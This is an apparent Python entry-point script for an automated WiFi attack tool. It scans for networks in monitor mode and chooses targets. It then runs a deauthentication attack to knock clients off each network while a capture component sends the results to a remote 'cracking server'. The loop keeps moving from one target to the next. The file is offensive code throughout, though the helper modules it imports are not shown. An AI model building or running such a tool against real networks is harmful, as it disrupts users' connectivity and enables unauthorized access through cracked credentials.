import sys
import argparse
import intel_collector
import stripload
import attacker
import exceptions
import time

TIMEOUT = 5 * 60

def str2addr(s):
    ip,port = s.split(":")
    return (ip, int(port))

def main(args):
    parser = argparse.ArgumentParser()
    parser.add_argument("iface", help="interface in monitor mode")
    parser.add_argument("server", help="ip:port of cracking server")
    parsed = parser.parse_args(args[1:])

    intel = intel_collector.IntelCollector(parsed.iface)
    stripper = stripload.StripLoad(parsed.iface, str2addr(parsed.server))
    stripper.start()
    failed = []

    while True:
        intel.start()
        now = time.time()
        target, clients = intel.choose_target(ignore=[f[0] for f in failed if now - f[1] < TIMEOUT / 2], timeout=TIMEOUT)
        intel.stop()
        attack = attacker.DeauthAttacker(parsed.iface, target, client=clients[0] if clients else None)
        attack.start()
        try:
            stripper.wait_load(target, TIMEOUT)
        except exceptions.Exception:
            failed.append((target, time.time()))

        intel.ignore(target)
        attack.stop()


if __name__ == "__main__":
    sys.exit(main(sys.argv))